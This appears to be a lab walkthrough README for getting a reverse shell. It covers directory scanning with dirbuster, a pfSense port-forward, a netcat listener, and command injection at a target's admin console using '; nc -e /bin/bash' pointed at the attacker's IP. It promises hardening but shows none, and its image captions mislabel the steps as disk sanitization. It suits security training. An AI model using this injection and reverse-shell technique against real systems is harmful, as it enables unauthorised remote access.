<h1>Revere Shell Walkthrough</h1>


<h2>Description</h2>
This project consist of a step-by-step walkthrough on how to capture and harden a secure shell. 
<br />


<h2>Languages and Utilities Used</h2>
 
- <b>Dirbuster</b>

<h2>Environments Used </h2>

- <b>Kali Linux</b> 

<h2>Program walk-through:</h2>

<p align="center">
	Scan the website using “dirbuster -v (insert I.P address)	That command will bring you into dirbuster GUI 
: <br/>
<img src="https://i.imgur.com/kO7F7Ll.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>

<p align="center">
	1.	Set up FIREWALL rule in your own network.
2.	In this Walkthrough we are using pfSense so this is what it will look like.
: <br/>
<img src="https://i.imgur.com/g4YOEXD.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>

<p align="center">
1.Set up a port listener (this is what catches your shell)
 2. Port forwarding rule ( this will forward the shell from router to kali machine)
  3. Payload (this will send the reverse shell)
The main tool used for a reversed shell will be (NetCat) command: nc -lvp (whatever port number you want to listen)
: <br/>
<img src="https://i.imgur.com/1S5vdWX.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>

<p align="center">
we will go to the TARGET IP ADRRES and because we scanned the IP address already using dirbuster we know to use 192.168.122.47/console/. This will take us to the “ADMIN PORTAL”

<p align="center">
<img src="https://i.imgur.com/uTcgbp0.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>

<p align="center">
From the Admin portal we will run the command “ ;nc -e /bin/bash( YOUR NETWORKS IP ADDRESS) and the port you are listening to. This will send the Shell to your network and the website should bounce and the terminal should look like this.
<p align="center">
<img src="https://i.imgur.com/JZkRFDS.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>

<p align="center">
SHELL VALIDATION
<p align="center">
  <img src="https://i.imgur.com/WCgSyhl.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>

  <p align="center">
  HOPE THIS HELPS!
  
